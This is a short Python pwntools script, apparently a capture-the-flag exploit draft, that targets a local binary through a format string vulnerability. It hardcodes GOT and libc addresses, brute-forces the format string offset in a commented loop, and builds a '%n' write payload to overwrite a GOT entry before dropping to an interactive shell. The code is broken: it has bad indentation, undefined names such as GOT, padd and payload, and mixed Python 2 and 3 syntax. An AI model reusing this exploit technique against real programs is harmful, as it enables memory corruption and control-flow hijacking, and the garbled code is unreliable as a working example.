from pwn import *
import sys

LOCAL=True

HOST =""
PORT =""

#DIRECCIONES

exit_got= 0x0000000000004f90
libc_start= 0x7ffff7dedb6b
read = 0x7ffff7ed3f81 

def exploit(r):

	#find correct format string parameter
	context.log_level="error"

	"""
	for i in range(1,256):
		r=process(["./console","log"])

		payload = "exit "
		payload += "%%%d$p" % i
		payload += "AAAABBBB"

		r.sendline(payload)
		r.recvline()

		data= r.recv(100)

		print("d => %s" % (i,data))

		r.close()

	"""
### correct alignament


		exp =""
		exp+=GOT
		exp+="%4$134513843x"
		exp+="%4$n"*4
		padd(exp)



		print(r.recvline())
		r.sendline(payload) #primer exp


		print r.recvline()
		data= r.recvline()

		print data



		r.interactive()
		return

if __name__ == "__main__":
    
    if len(sys.argv) >1:
        r=remote(HOST,PORT)
        exploit(r)
    else:
        r=process("./printf")
        print util.proc.pidof(r)
        pause()
        exploit(r)
